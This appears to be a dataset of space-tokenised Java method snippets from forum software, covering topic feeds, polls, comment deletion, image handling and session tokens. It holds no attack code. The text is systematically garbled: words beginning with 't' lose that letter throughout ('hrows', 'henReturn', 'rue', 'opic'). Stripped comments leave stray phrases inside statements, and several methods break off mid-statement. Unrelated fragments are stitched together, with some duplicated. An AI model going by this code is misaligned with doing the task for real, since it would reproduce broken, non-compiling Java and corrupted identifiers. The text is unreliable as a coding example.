public void initTest ( ) hrows Exception { UserService userService = mock ( UserService . class ) ; User splinter = mock ( User . class ) ; maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . henReturn ( false ) ; when ( JB . isBlocked ( ) ) . henReturn ( false ) ; when ( isden . isBlocked ( ) ) . henReturn ( rue ) ; when ( maxcom . getNick ( ) ) . henReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . henReturn ( " JB " ) ; when ( isden . getNick ( ) ) . henReturn ( " isden " ) ; when ( splinter . isBlocked ( ) ) . henReturn ( false ) ; when ( splinter . getNick ( ) ) . henReturn ( " splinter " ) ; when ( userService . getUserCached ( " splinter " ) ) . henReturn ( splinter ) ; when ( userService . getUserCached ( " maxcom " ) ) . henReturn ( maxcom ) ; when ( userService . getUserCached ( " JB " ) ) . henReturn ( JB ) ; when ( userService . getUserCached ( " isden " ) ) . henReturn ( isden ) ; when ( userService . getUserCached ( " hizel " ) ) . henThrow ( new UserNotFoundException ( " hizel " ) ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getSecureURI ( ) ) . henReturn ( mainURI ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( userService ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; } 
public void init ( ) hrows Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void initTest ( ) hrows Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month , int count ) hrows TagNotFoundException { logger . debug ( " TopicListService.getTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . oString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . oString ( ) : " (null) " ) + " ; tag= " + ag + " ; offset= " + offset + " ; year= " + year + " ; month= " + month ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agService . getTagId ( ag ) ) ; } if ( month ! = null & & year ! = null ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( count ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return opicListDao . getTopics ( opicListDto ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean ech ) { logger . debug ( " TopicListService.getRssTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . oString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . oString ( ) : " (null) " ) + " ; fromDate= " + fromDate + " ; noTalks= " + noTalks + " ; tech= " + ech ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; opicListDto . setFromDate ( fromDate ) ; opicListDto . setNotalks ( noTalks ) ; opicListDto . setTech ( ech ) ; opicListDto . setLimit ( 20 ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return opicListDao . getTopics ( opicListDto ) ; } 
public List < Topic > getAllTopicsFeed ( Section section , Date fromDate ) { logger . debug ( " TopicListService.getAllTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . oString ( ) : " (null) " ) + " ; fromDate= " + fromDate ) ; TopicListDto opicListDto = new TopicListDto ( ) ; opicListDto . setCommitMode ( TopicListDao . CommitMode . UNCOMMITED_ONLY ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; opicListDto . setFromDate ( fromDate ) ; return opicListDao . getTopics ( opicListDto ) ; } 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter ) hrows TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " ags " ) ; Collection < String > firstLetters = agService . getFirstLetters ( ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { List < TagCloudDao . TagDTO > list = agDao . getTags ( 100 ) ; modelAndView . addObject ( " agcloud " , list ) ; } else { modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < TagRef , Integer > ags = agService . getTagsByPrefix ( firstLetter , 1 ) ; if ( ags . isEmpty ( ) ) { hrow new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " ags " , ags ) ; } return modelAndView ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( HOVER_PROPERTY , Boolean . TRUE ) ; builder . put ( STYLE_PROPERTY , " ango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " quot " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , rue ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , rue ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public static Predicate < String > boxPredicate ( ) { return DefaultProfile : : isBox ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( STYLE_PROPERTY , " ango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " quot " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , rue ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , rue ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
private RowMapper < ArchiveStats > mapper ( final Section section , final Group group ) { return ( rs , rowNum ) - > new ArchiveStats ( section , group , rs . getInt ( " year " ) , rs . getInt ( " month " ) , rs . getInt ( " c " ) ) ; } 
protected ModelAndView getData ( HttpServletRequest request ) hrows Exception { final Poll poll = pollDao . getMostRecentPoll ( ) ; Topic msg = messageDao . getById ( poll . getTopicId ( ) ) ; int count = pollDao . getVotersCount ( poll . getId ( ) ) ; int countUsers = pollDao . getCountUsers ( poll ) ; ModelAndView result = new ModelAndView ( " boxlets/poll " ) ; result . addObject ( " poll " , poll ) ; result . addObject ( " count " , count ) ; result . addObject ( " message " , msg ) ; result . addObject ( " countUsers " , countUsers ) ; return result ; } 
public Poll getMostRecentPoll ( ) hrows PollNotFoundException { return getPoll ( getMostRecentPollId ( ) ) ; } 
public Poll getPoll ( final int pollId ) hrows PollNotFoundException { SqlRowSet rs = jdbcTemplate . queryForRowSet ( queryPool , pollId ) ; if ( ! rs . next ( ) ) { hrow new PollNotFoundException ( ) ; } return new Poll ( pollId , 
private File processUploadImage ( HttpServletRequest request ) hrows IOException { if ( request instanceof MultipartHttpServletRequest ) { MultipartFile multipartFile = ( ( MultipartRequest ) request ) . getFile ( " image " ) ; if ( multipartFile ! = null & & ! multipartFile . isEmpty ( ) ) { File uploadedFile = File . createTempFile ( " lor-image- " , " " ) ; logger . debug ( " Transfering upload to: " + uploadedFile ) ; multipartFile . ransferTo ( uploadedFile ) ; return uploadedFile ; } } return null ; } 
public void voteGetCurrentPollTest ( ) hrows Exception { int currentPollId = pollDao . getMostRecentPollId ( ) ; Poll poll = pollDao . getMostRecentPoll ( ) ; assertEquals ( currentPollId , poll . getId ( ) ) ; } 
public void estToHtmlFormatter ( ) { assertEquals ( RESULT1 , oHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , oHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , oHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , oHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , oHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , oHtmlFormatter . format ( TEXT10 , false ) ) ; assertEquals ( RESULT11 , oHtmlFormatter . format ( TEXT11 , false ) ) ; assertEquals ( RESULT12 , oHtmlFormatter . format ( TEXT12 , false ) ) ; assertEquals ( RESULT13 , oHtmlFormatter . format ( TEXT13 , false ) ) ; assertEquals ( RESULT14 , oHtmlFormatter . format ( TEXT14 , false ) ) ; assertEquals ( RESULT15 , oHtmlFormatter . format ( TEXT15 , false ) ) ; assertEquals ( RESULT16 , oHtmlFormatter . format ( TEXT16 , false ) ) ; assertEquals ( RESULT17 , oHtmlFormatter . format ( TEXT17 , false ) ) ; assertEquals ( RESULT17_2 , oHtmlFormatter . format ( TEXT17_2 , false ) ) ; assertEquals ( RESULT18 , oHtmlFormatter . format ( TEXT18 , false ) ) ; assertEquals ( RESULT19 , oHtmlFormatter . format ( TEXT19 , false ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public MemoriesDao memoriesDao ( DataSource ds ) { return new MemoriesDao ( ds ) ; } 
public List < Integer > deleteWithReplys ( Topic opic , Comment comment , String reason , User user , int scoreBonus ) { CommentList commentList = commentService . getCommentList ( opic , false ) ; CommentNode node = commentList . getNode ( comment . getId ( ) ) ; List < CommentAndDepth > replys = getAllReplys ( node , 0 ) ; List < Integer > deleted = deleteReplys ( comment , reason , replys , user , - scoreBonus ) ; userEventService . processCommentsDeleted ( deleted ) ; return deleted ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Topic . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String ext ) hrows IllegalArgumentException { ry { setValue ( opicDao . getById ( Integer . parseInt ( ext . split ( " , " ) [ 0 ] ) ) ) ; } catch ( MessageNotFoundException e ) { hrow new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String ext ) hrows IllegalArgumentException { if ( ext . isEmpty ( ) | | " 0 " . equals ( ext ) ) { setValue ( null ) ; return ; } ry { setValue ( commentDao . getById ( Integer . parseInt ( ext ) ) ) ; } catch ( MessageNotFoundException e ) { hrow new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( User . class , new UserPropertyEditor ( userService ) ) ; } 
public void setAsText ( String ext ) hrows IllegalArgumentException { ry { setValue ( opicDao . getById ( Integer . parseInt ( ext . split ( " , " ) [ 0 ] ) ) ) ; 
protected String makeTokenSignature ( long okenExpiryTime , String username , String password ) { String data = username + " : " + okenExpiryTime + " : " + password + " : " + getKey ( ) ; int okenGeneration = userDao . getTokenGeneration ( username ) ; if ( okenGeneration > 0 ) { zero means user does not use close all sessions ever data += ":" + String.format("%d", tokenGeneration); } MessageDigest digest; try { digest = MessageDigest.getInstance("MD5"); } catch (NoSuchAlgorithmException e) { throw new IllegalStateException("No MD5 algorithm available!"); } return new String(Hex.encode(digest.digest(data.getBytes()))); } 
public ModelAndView logoutAllDevices ( HttpServletRequest request , HttpServletResponse response ) { userDao . unloginAllSessions ( Template . getTemplate ( request ) . getCurrentUser ( ) ) ; return logout ( request , response ) ; } 
public void unloginAllSessions ( User user ) { jdbcTemplate . update ( " UPDATE users SET token_generation=token_generation+1 WHERE id=? " , user . getId ( ) ) ; } 
public ModelAndView logoutAllDevices ( HttpServletRequest request , HttpServletResponse response ) { if ( AuthUtil . isSessionAuthorized ( ) ) { userDao . unloginAllSessions ( Template . getTemplate ( request ) . getCurrentUser ( ) ) ; } return logout ( request , response ) ; } 
public void insert ( EditHistoryRecord editHistoryRecord ) { editInsert . execute ( new BeanPropertySqlParameterSource ( editHistoryRecord ) ) ; } 
public void insert ( EditHistoryRecord editHistoryRecord ) { editHistoryDao . insert ( editHistoryRecord ) ; } 
public StandaloneWSClient httpClient ( ) { return mock ( StandaloneWSClient . class ) ; } 
public void deleteInactivated ( ) { jdbcTemplate . update ( " delete from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'3 days'::interval " ) ; } 
private static BufferedImage removeTransparency ( BufferedImage image ) { BufferedImage outImage = new BufferedImage ( image . getWidth ( null ) , image . getHeight ( null ) , BufferedImage . TYPE_INT_RGB ) ; Graphics2D g = outImage . createGraphics ( ) ; g . drawImage ( image , 0 , 0 , outImage . getWidth ( ) , outImage . getHeight ( ) , Color . WHITE , null ) ; return outImage ; } 
private void prepareModelForCommonException ( ModelAndView modelAndView , HttpServletRequest request , Exception exception ) { modelAndView . addObject ( " headTitle " , StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) ) ; String errorMessage = exception . getMessage ( ) = = null ? StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) : StringUtil . escapeHtml ( exception . getMessage ( ) ) ; modelAndView . addObject ( " errorMessage " , errorMessage ) ; ExceptionType exceptionType = ExceptionType . OTHER ; if ( exception instanceof UserErrorException ) { exceptionType = ExceptionType . IGNORED ; } else if ( exception instanceof ScriptErrorException | | exception instanceof RequestRejectedException ) { logger . debug ( " errors/common.jsp " , exception ) ; exceptionType = ExceptionType . SCRIPT_ERROR ; } else { logger . warn ( " Unexcepted exception caught " , exception ) ; String infoMessage = emailService . sendExceptionReport ( request , exception ) ; modelAndView . addObject ( " infoMessage " , infoMessage ) ; } modelAndView . addObject ( " exceptionType " , exceptionType . name ( ) ) ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) hrows Exception { Topic message = messageDao . getById ( msgid ) ; Template mpl = Template . getTemplate ( request ) ; Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; opicPermissionService . checkView ( group , message , mpl . getCurrentUser ( ) , false ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; return modelAndView ; } 
public ModelAndView showCommentEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid , @PathVariable ( " commentid " ) int commentId ) hrows Exception { Topic message = messageDao . getById ( msgid ) ; Comment comment = commentService . getById ( commentId ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( comment ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; return modelAndView ; } 
public boolean isImageDeleted ( ) { return imageDeleted ; } 
public ModelAndView deleteForm ( @RequestParam int id , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic opic = opicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( opic , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , mpl . getCurrentUser ( ) ) ; ModelAndView mv = new ModelAndView ( " delete_image " ) ; mv . addObject ( " image " , image ) ; mv . addObject ( " preparedTopic " , preparedTopic ) ; return mv ; } 
public RedirectView deleteImage ( @RequestParam int id , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic opic = opicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( opic , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , mpl . getCurrentUser ( ) ) ; imageService . deleteImage ( mpl . getCurrentUser ( ) , image ) ; return new RedirectView ( TopicLinkBuilder . baseLink ( opic ) . forceLastmod ( ) . build ( ) ) ; } 
private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , String message , UploadedImagePreview scrn , Topic previewMsg ) hrows Exception { session . removeAttribute ( " image " ) ; int msgid = opicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; } String messageUrl = " view-message.jsp?msgid= " + msgid ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( messageUrl ) ) ; } params . put ( " moderated " , section . isPremoderated ( ) ) ; params . put ( " url " , messageUrl ) ; return new ModelAndView ( " add-done-moderated " , params ) ; } 
public ModelAndView show ( HttpServletRequest request , @ModelAttribute ( " form " ) DeregisterRequest form ) { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; return new ModelAndView ( " deregister " ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new DeregisterRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean supports ( Class aClass ) { return DeregisterRequest . class . equals ( aClass ) ; } 
private boolean doDeleteComment ( int msgid , String reason , User user , int scoreBonus ) { boolean deleted = commentDao . deleteComment ( msgid , reason , user ) ; if ( deleted ) { deleteInfoDao . insert ( msgid , user , reason , scoreBonus ) ; } return deleted ; } 
private boolean doDeleteComment ( int msgid , String reason , User user ) { return doDeleteComment ( msgid , reason , user , 0 ) ; } 
public String renderToHtml ( String content ) { You can re-use parser and renderer instances Node document = parser.parse(content); return renderer.render(document); } 
public void estMarkdownFormatter ( ) { assertEquals ( TEXT1_RESULT , markdownFormatter . renderToHtml ( TEXT1 ) ) ; } 
private PreparedComment prepareComment ( @Nonnull Comment comment ) hrows UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; return prepareComment ( messageText , author , null , comment , null , null , null ) ; } 
private PreparedRSSComment prepareRSSComment ( @Nonnull MessageText messageText , @Nonnull Comment comment ) hrows UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = prepareCommentTextRSS ( messageText ) ; return new PreparedRSSComment ( comment , author , processedMessage ) ; } 
public PreparedComment prepareCommentForReplyto ( Comment comment ) hrows UserNotFoundException { return prepareComment ( comment ) ; } 
public List < PreparedRSSComment > prepareCommentListRSS ( @Nonnull List < Comment > list ) hrows UserNotFoundException { List < PreparedRSSComment > commentsPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; commentsPrepared . add ( prepareRSSComment ( messageText , comment ) ) ; } return commentsPrepared ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , boolean secure , @Nonnull Template mpl , @Nonnull Topic opic ) hrows UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > exts = msgbaseDao . getMessageText ( Lists . ransform ( list , Comment : : getId ) ) ; Map < Integer , User > users = loadUsers ( Iterables . ransform ( list , Comment : : getUserid ) ) ; User currentUser = mpl . getCurrentUser ( ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } List < PreparedComment > commentsPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText ext = exts . get ( comment . getId ( ) ) ; User author = users . get ( comment . getUserid ( ) ) ; Remark remark = remarks . get ( author . getId ( ) ) ; String remarkText = null ; if ( remark ! = null ) { remarkText = remark . getText ( ) ; } commentsPrepared . add ( prepareComment ( ext , author , remarkText , comment , comments , mpl , opic ) ) ; } return commentsPrepared ; } 
private String prepareCommentText ( MessageText messageText , boolean nofollow ) { if ( messageText . isLorcode ( ) ) { return lorCodeService . parseComment ( messageText . ext ( ) , nofollow ) ; 
private String prepareCommentTextRSS ( MessageText messageText ) { return lorCodeService . prepareTextRSS ( messageText . ext ( ) , messageText . isLorcode ( ) ) ; } 
public ModelAndView deleteForm ( @RequestParam int id , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic opic = opicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( opic , mpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , mpl . getCurrentUser ( ) ) ; ModelAndView mv = new ModelAndView ( " delete_image " ) ; mv . addObject ( " image " , image ) ; mv . addObject ( " preparedTopic " , preparedTopic ) ; return mv ; } 
public RedirectView deleteImage ( @RequestParam int id , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic opic = opicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( opic , mpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , mpl . getCurrentUser ( ) ) ; imageService . deleteImage ( mpl . getCurrentUser ( ) , image ) ; return new RedirectView ( TopicLinkBuilder . baseLink ( opic ) . forceLastmod ( ) . build ( ) ) ; } 
public ModelAndView opics ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) { Group group = groupDao . getGroup ( groupId ) ; if ( offsetObject ! = null ) { return new ModelAndView ( new RedirectView ( group . getUrl ( ) + " ?offset= " + offsetObject . oString ( ) ) ) ; 
public ModelAndView opicsLastmod ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) { Group group = groupDao . getGroup ( groupId ) ; if ( offsetObject ! = null ) { return new ModelAndView ( new RedirectView ( group . getUrl ( ) + " ?offset= " + offsetObject . oString ( ) + " &lastmod=true " ) ) ; 
public ModelAndView showForm ( @RequestParam ( " group " ) int id , ServletRequest request ) { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Group group = groupDao . getGroup ( id ) ; ModelAndView mv = new ModelAndView ( " groupmod " , " group " , group ) ; mv . getModel ( ) . put ( " groupInfo " , prepareService . prepareGroupInfo ( group ) ) ; return mv ; } 
private MessageText messageTextOf ( ResultSet resultSet ) hrows SQLException { String ext = resultSet . getString ( " message " ) ; String markup = resultSet . getString ( " markup " ) ; return new MessageText ( ext , MarkupType$ . MODULE$ . of ( markup ) ) ; } 
private void loadTopicScroller ( Map < String , Object > params , Topic opic , User currentUser , boolean useIgnoreList ) { Topic prevMessage ; Topic nextMessage ; if ( useIgnoreList ) { prevMessage = messageDao . getPreviousMessage ( opic , currentUser ) ; nextMessage = messageDao . getNextMessage ( opic , currentUser ) ; } else { prevMessage = messageDao . getPreviousMessage ( opic , null ) ; nextMessage = messageDao . getNextMessage ( opic , null ) ; } params . put ( " prevMessage " , prevMessage ) ; params . put ( " nextMessage " , nextMessage ) ; boolean opScroller ; SectionScrollModeEnum sectionScroller = sectionService . getScrollMode ( opic . getSectionId ( ) ) ; if ( prevMessage = = null & & nextMessage = = null ) { opScroller = false ; } else { opScroller = sectionScroller ! = SectionScrollModeEnum . NO_SCROLL ; } params . put ( " opScroller " , opScroller ) ; Boolean bottomScroller = sectionScroller ! = SectionScrollModeEnum . NO_SCROLL ; params . put ( " bottomScroller " , bottomScroller ) ; } 
public PreparedTopic prepareTopic ( Topic message , User user ) { return prepareMessage ( message , 
public PreparedTopic prepareTopic ( Topic message , List < TagRef > ags , User user , MessageText ext ) { return prepareMessage ( message , 
public PreparedTopic prepareTopicPreview ( Topic message , List < TagRef > ags , Poll newPoll , String ext , Image image ) { return prepareMessage ( message , 
private PreparedTopic prepareMessage ( Topic message , List < TagRef > ags , boolean minimizeCut , PreparedPoll poll , User user , MessageText ext , @Nullable Image image ) { ry { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , User user , Profile profile , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > ags = opicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , ags . get ( message . getId ( ) ) , rue , null , user , extMap . get ( message . getId ( ) ) , null ) ; TopicMenu opicMenu = getTopicMenu ( preparedMessage , user , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages ) { List < PreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > ags = opicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , ags . get ( message . getId ( ) ) , rue , null , null , extMap . get ( message . getId ( ) ) , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public String extractPlainText ( MessageText ext ) { if ( ext . isLorcode ( ) ) { return extractPlainTextFromLorcode ( ext . ext ( ) ) ; 
